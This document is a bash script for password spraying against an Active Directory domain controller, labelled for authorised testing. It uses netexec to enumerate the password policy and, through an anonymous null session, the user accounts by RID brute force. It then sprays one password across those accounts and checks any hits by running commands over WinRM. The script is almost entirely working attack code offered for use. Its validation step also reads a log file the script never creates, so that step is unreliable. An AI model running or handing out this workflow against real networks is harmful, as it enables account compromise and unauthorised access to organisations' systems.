#!/bin/bash
# AD Password Spraying Workflow Helper
# For authorized security testing only

set -e

# Configuration
DC_FQDN="${1:-}"
DC_IP="${2:-}"
USER_LIST="${3:-users.txt}"
PASSWORD="${4:-}"

if [[ -z "$DC_FQDN" ]]; then
    echo "Usage: $0 <DC_FQDN> <DC_IP> <user_list> <password>"
    echo "Example: $0 dc01.corp.local 10.10.10.10 users.txt Password123!"
    exit 1
fi

echo "=== AD Password Spraying Workflow ==="
echo "Target: $DC_FQDN ($DC_IP)"
echo "Users: $USER_LIST"
echo ""

# Step 1: Clock synchronization
echo "[1/6] Synchronizing clock..."
sudo ntpdate "$DC_FQDN" 2>/dev/null || echo "Warning: Could not sync clock"

# Step 2: Generate hosts file
echo "[2/6] Generating hosts file for Kerberos resolution..."
netexec smb "$DC_IP" --generate-hosts-file hosts 2>/dev/null || true
if [[ -f hosts ]]; then
    cat hosts /etc/hosts | sudo tee -a /etc/hosts > /dev/null 2>&1 || true
    echo "Hosts file updated"
fi

# Step 3: Enumerate password policy
echo "[3/6] Enumerating password policy..."
netexec smb "$DC_FQDN" -u '' -p '' --pass-pol 2>/dev/null || \
    echo "Warning: Could not enumerate policy (may need valid creds)"

# Step 4: RID brute for user enumeration (if needed)
echo "[4/6] RID brute enumeration (optional)..."
if [[ ! -f "$USER_LIST" ]]; then
    netexec smb "$DC_FQDN" -u '' -p '' --rid-brute 2>/dev/null | \
        awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > "$USER_LIST"
    echo "Users saved to $USER_LIST"
fi

# Step 5: Password spray
echo "[5/6] Starting password spray..."
netexec smb "$DC_FQDN" -u "$USER_LIST" -p "$PASSWORD" \
    --continue-on-success --no-bruteforce --shares 2>/dev/null || true

# Step 6: Validate hits via WinRM
echo "[6/6] Validating successful credentials..."
# Parse successful hits and validate
grep "\[+\]" netexec.log 2>/dev/null | while read line; do
    user=$(echo "$line" | grep -oP 'user=\K[^ ]+')
    if [[ -n "$user" ]]; then
        echo "Validating $user..."
        netexec winrm "$DC_FQDN" -u "$user" -p "$PASSWORD" -x "whoami" 2>/dev/null || true
    fi
done

echo ""
echo "=== Workflow Complete ==="
echo "Check netexec.log for results"
